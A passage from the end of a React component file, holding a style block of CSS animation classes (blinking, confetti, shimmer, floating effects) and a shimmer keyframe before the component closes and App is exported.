        .animate-liveBlink { animation: liveBlink 1.4s infinite step-start; }
        .animate-blinkRed { animation: blinkRed 1s infinite; }
        .animate-discountRibbon { animation: discountRibbon 1.2s infinite alternate; }
        .animate-ringPop { animation: ringPop 1.5s infinite; }
        .animate-glowPulse { animation: glowPulse 2.5s infinite alternate; }
        .animate-shimmerSlow { animation: shimmerSlow 8s infinite; }
        .animate-gradientMove { animation: gradientMove 4s ease infinite; }
        .animate-fadeIn { animation: fadeIn 0.3s ease-out; }
        .animate-confetti-cannon { animation: confetti-cannon 2s ease-out forwards; }
        .animate-confetti-spiral { animation: confetti-spiral 1.5s ease-out forwards; }
        .animate-float { animation: float 3s ease-in-out infinite; }
        .animate-spinSlow { animation: spinSlow 6s infinite linear; }
        .animate-pulse-slow { animation: pulse-slow 3s ease-in-out infinite; }
        .animate-shimmer {
          animation: shimmer 2s infinite;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
          background-size: 200% 100%;
        }
        @keyframes shimmer {
          0% { background-position: -200% 0; }
          100% { background-position: 200% 0; }
        }
      `}</style>
    </div>
  );
}

export default App;